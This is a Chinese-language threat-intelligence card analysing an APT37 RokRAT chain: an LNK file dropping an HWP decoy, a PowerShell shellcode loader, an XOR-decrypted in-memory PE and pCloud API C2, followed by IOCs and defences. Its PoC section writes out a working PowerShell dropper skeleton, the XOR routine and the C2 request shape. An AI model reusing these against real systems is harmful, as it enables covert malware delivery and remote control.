---
id: code-analysis-reverse-windows-rokratt-lnk-csharp-powershell-xor-pe-pcloud-c2
title: APT37 RokRAT 2024 样本执行链：LNK 内嵌 C# 释放 HWP 诱饵与三文件 → PowerShell 壳码加载器 → XOR 解密 PE 内存执行 → pCloud 云盘 C2
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: rokratt-lnk-csharp-powershell-xor-pe-pcloud-c2
tags:
- windows
- malware-analysis
- apt37
- rokratt
- lnk
- powershell
- csharp
- shellcode
- xor
- memory-pe
- pcloud
- c2
- threat-intelligence
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V527
  verified_at: '2026-11-11T15:01:43+08:00'
  notes: 已对照原文 content.md 与全部 32 张图核对：LNK 目标 cmd /k、自匹配长度 0x0DD6DA21、偏移链 0x162E/0x4422E/0x11D630/0x11DBDA 与长度 0x42C00/0xD9402(889858)/0x5AA/0x135 首尾相接、Add-Type 内嵌 C#、public.dat 壳码、ROR 解 API/XOR 解 PE、RtlFillMemory 0x40/0x400、入口 0x71B375、RtlGetVersion 6.1.7601、vmtoolsd 10.0.5.520、api.pcloud.com/listfolder?path=、Googlebot UA 均一致。验证中修正了草稿 PoC 的 4 处常量笔误（0x00D6DA21→0x0DD6DA21、0x4C200→0x42C00、0xA5A→0x5AA、0x11D8DA→0x11DBDA）并更正诱饵打开方式(& 而非 Start-Process)与 GlobalAlloc(0x40)=GMEM_ZEROINIT 语义。原文未给产品版本、无 CVE；dedup 20 候选均 new，与旧 HWP-LNK 单原语卡非同一样本链。PoC 未执行。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-rokratt-lnk-csharp-powershell-xor-pe-pcloud-c2/
draft: false
kb_aliases:
- RokRAT 样本分析
- APT37 远控
- LNK 内嵌 C# 加载器
- public.dat shellcode
- temp.dat PowerShell 加载器
- pCloud 云盘 C2
- RandData.dat
- RokRAT 更新迭代
---

## 一句话结论

APT37 主战远控 RokRAT 的新样本用单个 LNK 携带 HWP 诱饵与多段载荷：LNK 命令行以精确长度匹配自身，用固定偏移切出同名 HWP 诱饵及 `public.dat`、`temp.dat`、`working.bat` 三个文件并释放执行；`working.bat` 调隐藏 PowerShell 执行 `temp.dat` 壳码加载器，把 `public.dat`（889,858 字节壳码）读入 RWX 内存并建线程执行；壳码用 ROR 解 API 名、XOR 解出内嵌 PE，复制到新内存并抹掉 PE 头后跳到入口点运行 C++ RAT；RAT 收集主机/VMware/BIOS 信息后，以 Googlebot UA 和 OAuth Token 请求 `api.pcloud.com/listfolder?path=` 完成云盘 C2。

## 原理

- **LNK 作为单文件载荷容器**：快捷方式目标为 `%windir%\SysWOW64\cmd.exe /k`，后接长 PowerShell 单行。脚本用 `dir ...\*rsh*ell*.exe` 通配匹配出 `powershell.exe`（避免明文路径特征），再以 `Add-Type` 现场编译内嵌 C#；C# 中 DLL 名用 `[System.Text.Encoding]::UTF8.GetString(34)` 拼出引号，规避 `"user32.dll"` 字面量。
- **反侦查与自定位**：C# 调 `FindWindow(null,'powershell.exe')` + `ShowWindow(...,0)` 隐藏 PowerShell 窗口；若当前目录含 `System32` 或 `Program Files` 就改用 `%temp%`；用 `Get-ChildItem -Recurse *.lnk` 按精确文件长度匹配自身，`FileStream.Seek` 从固定偏移（如 `0x162E`、`0x4422E`、`0x11D630`、`0x11DBDA`）切出：同名 `.hwp` 诱饵（`Set-Content` 写出后 `&` 执行打开迷惑受害者）、`%public%\public.dat`（壳码）、`%temp%\temp.dat`（PowerShell 加载器）、`%temp%\working.bat`（启动器），执行完后删除原 LNK。
- **两级脚本加载**：`working.bat` 用 `start /min ... powershell.exe -windowstyle hidden` 读取 `temp.dat` 字节、UTF8 解码后 `[scriptblock]::Create()` 执行；`temp.dat` 通过 Add-Type 声明 `GlobalAlloc`/`VirtualProtect`/`CreateThread`/`WaitForSingleObject`（DLL 名同样用 UTF8 引号拼接），读 `public.dat` 到字节数组，`GlobalAlloc(0x40,size)` 分配内存（0x40 为 GMEM_ZEROINIT）、`VirtualProtect(...,0x40)` 改为 PAGE_EXECUTE_READWRITE、`Marshal.WriteByte` 逐字节写入、`CreateThread` 执行、`WaitForSingleObject(...,500*1000)` 等待。
- **壳码解密与内存 PE 执行**：壳码（889,858 字节）先以 ROR 循环解密 API 名字符串，再用逐字节 XOR `dst[i] = key ^ src[i+5]` 解密内嵌 PE；`VirtualAlloc` 新内存后用 `RtlMoveMemory` 分段复制 PE，循环 `LoadLibraryA("KERNEL32.dll")`/`GetProcAddress` 解析导入；随后 `RtlFillMemory` 用 `0xFD` 覆盖 PE 起始 64 字节（另处覆盖前 `0x400` 字节），破坏 PE 头以对抗内存 dump/扫描；最后把 PE 入口地址（基址 `0x6E0000`，入口 `0x71B375`）放入 `ECX` 跳转执行。入口反汇编为 MSVC 19.00.24210 编译的 `start`（`__security_init_cookie` → `__scrt_common_main_seh`），证明解密出的是完整 C++ PE。
- **RAT 主机侦察**：主函数用 `RtlGetVersion` 取系统版本（样本环境为 6.1.7601），读取 `C:\Program Files\VMware\VMware Tools\vmtoolsd.exe` 版本（VMware 检测，如 10.0.5.520），`IsWow64` 判断 32 位进程跑在 64 位系统，取计算机名/用户名/当前模块路径/BIOS 信息；用 `rand()` 生成随机路径 `C:\Windows\<随机>.dat`（存在则删除），并含管理员权限判断。
- **云盘 C2**：`WinHttpOpen`（UA 伪装 `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`）→ `WinHttpConnect("api.pcloud.com",443)` → `WinHttpOpenRequest` → `WinHttpAddRequestHeaders`，URL 构造为 `https://api.pcloud.com/listfolder?path=%s`；原文捕获到两种鉴权头形态：`Authorization: OAuth <内置token>` 与 `Authorization: Bearer <token>`，并带 `Content-Type: application/json`；设置 DNS/连接/发送/接收超时，并解析响应头 `Content-Length`/`Location` 处理下载到的后续资源。整个 C2 只访问合法云盘域名，TLS 流量与正常 pCloud 客户端同源，出口防火墙难以按域名阻断。
- **为什么成立**：诱饵真实（HWP 文档）+ 快捷方式隐蔽 + 全部载荷塞进一个 LNK，用户只看到"文档"；二、三阶段都在脚本/内存中，静态检查难看到 PE；云盘作为 C2 无需自建基础设施，Token 泄露即可接管通道。

## 触发条件

- 受害者收到含 `.hwp.lnk` 双扩展名（或其它文档名伪装）的压缩包/邮件并双击；系统允许 `cmd.exe` 与 `powershell.exe`、`.NET Framework` 的 `Add-Type` 编译。
- LNK 所在目录可写（需释放同名 HWP 与三个载荷文件）、当前用户可删除该 LNK。
- 主机可出网访问 `api.pcloud.com:443`，样本内置的 OAuth Token 有效（未吊销）。
- 分析侧：拥有样本与 x64dbg/IDA 环境；能从 LNK ASCII 流或内存中取出各段载荷。

## 利用步骤

1. 检查 LNK 的 ASCII 流/快捷方式目标，提取并还原被截断的长 PowerShell 命令行；记录用于自定位的文件长度常量与各段偏移。
2. 按偏移切出 `.hwp` 诱饵、`public.dat`、`temp.dat`、`working.bat`，确认 `working.bat → temp.dat → public.dat` 的调用关系。
3. 用一个最小 C 加载器（`CreateFile`→`VirtualAlloc(RWX)`→`ReadFile`→`retn` 跳入）复现 `public.dat` 执行，或在调试器中把断点下在 `VirtualAlloc`/`ReadFile` 后 dump 壳码。
4. 在壳码 XOR 解密循环结束后 dump 解密出的 PE；注意壳码随后会覆盖 PE 头 0x40/0x400 字节，需在覆盖前 dump 或手工补回 PE 头再载入 IDA。
5. 定位入口（如 `0x71B375`）与主函数，梳理侦察字段、`RandData.dat` 行为与 WinHttp 请求；提取 UA、`api.pcloud.com/listfolder?path=`、`Authorization: OAuth <token>` 作为 IOC。
6. 结合前代样本（HWP 诱饵 + Dropbox 二阶段）对比偏移、释放文件与云服务差异，归因同一家族。

## PoC

LNK 自提取多载荷的最小骨架（偏移/长度按样本调整，仅演示逻辑）：

```powershell
$lnk = Get-ChildItem -Recurse *.lnk | Where-Object { $_.Length -eq 0x0DD6DA21 } | Select-Object -First 1
$fs  = New-Object System.IO.FileStream($lnk.FullName,'Open','Read')
function Cut([long]$off,[int]$len,[string]$out){
  $b = New-Object byte[] $len
  $fs.Seek($off,'Begin') | Out-Null
  $fs.Read($b,0,$len) | Out-Null
  [System.IO.File]::WriteAllBytes($out,$b)
}
Cut 0x162E  0x42C00 ($lnk.FullName -replace '\.lnk$','.hwp')   # 诱饵文档
Cut 0x4422E 0xD9402 ($env:public + '\public.dat')             # 壳码
Cut 0x11D630 0x5AA  ($env:temp   + '\temp.dat')               # PowerShell 加载器
Cut 0x11DBDA 0x135  ($env:temp   + '\working.bat')            # 启动脚本
& ($env:temp + '\working.bat'); $fs.Close(); Remove-Item $lnk.FullName -Force
```

壳码 XOR 解密 PE 的核心逻辑（按样本反编译整理）：

```c
for (i = 0; i < size; i++)
    dst[i] = key ^ src[i + 5];   // key 为单字节密钥，src+5 跳过前置数据
```

pCloud C2 请求形态（示意，未执行）：

```http
GET https://api.pcloud.com/listfolder?path=/ HTTP/1.1
Host: api.pcloud.com
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Authorization: OAuth <内置token>
Content-Type: application/json
```

注：以上 PoC 未在本机执行；文章为不可信数据，仅记录原理。

## 变体与关联

- 云盘 C2 变体：Dropbox OAuth refresh_token、Google Drive、Microsoft Graph/OneDrive、SharePoint 等文件 API 都能替换 pCloud；文章同时给出 `Authorization: Bearer` 与 `Authorization: OAuth` 两种头形态，说明该家族按云服务切换鉴权方式。
- LNK 诱饵变体：前代样本用同型 LNK 按长度匹配、偏移切出 HWP 诱饵后接 Dropbox 二阶段；本样本把 C# 编排、环境判断与多文件释放加进来，二阶段换成 pCloud。
- 加载器变体：XOR/滚动密钥解 PE + 内存映射的同类实现见 DarkGate 手动映射 PE、Amadey API hash 解析、BloodAlchemy AES/FNV/LZNT1 链；本样本差异是"ROR 解 API 名 + 单字节 XOR 解 PE + 抹 PE 头 + 入口地址跳转"。
- 关联：[[pentest-initial-access-lnk-self-embedded-hwp-decoy-offset-extraction]]、[[pentest-c2-dropbox-oauth-refresh-token-file-c2]]、[[code-analysis-reverse-windows-darkgate-marker-xor-keyindex-manual-pe-loader]]、[[code-analysis-reverse-windows-amadey-api-hash-loader-c2-config]]、[[code-analysis-reverse-windows-bloodalchemy-loader-aes-fnv-lznt1]]。

## 检测与防御

- 邮件/入口：拦截压缩包内的 `.lnk`（尤其 `.hwp.lnk`/`.pdf.lnk` 双扩展名与数百 KB 以上体积）；显示真实扩展名；对 HWP/Office 用户做定向培训。
- 进程链：`explorer.exe → cmd.exe /k → powershell.exe`（隐藏窗口）；命令行含 `*rsh*ell*.exe`、`Add-Type`、`FindWindow`/`ShowWindow`、`Get-ChildItem *.lnk`、`FileStream.Seek`、`Remove-Item *.lnk`。
- 文件：同目录出现与 LNK 同名的 HWP；`%public%\public.dat`、`%temp%\temp.dat`、`%temp%\working.bat`；`C:\Windows\RandData.dat`（随机名 .dat）。
- 网络：非浏览器进程（powershell/cmd/未知 C++ 程序）访问 `api.pcloud.com` 且携带 Googlebot UA 与 `Authorization: OAuth/Bearer`；`listfolder?path=` 列举行为；对云盘 API 做进程级白名单与出站审计。
- 主机加固：AppLocker/WDAC 限制用户目录执行 LNK/脚本；禁用不必要的 PowerShell 与 Add-Type；启用脚本块日志与 Sysmon 文件/进程/网络事件关联；发现后吊销云盘 Token 并排查同源样本。
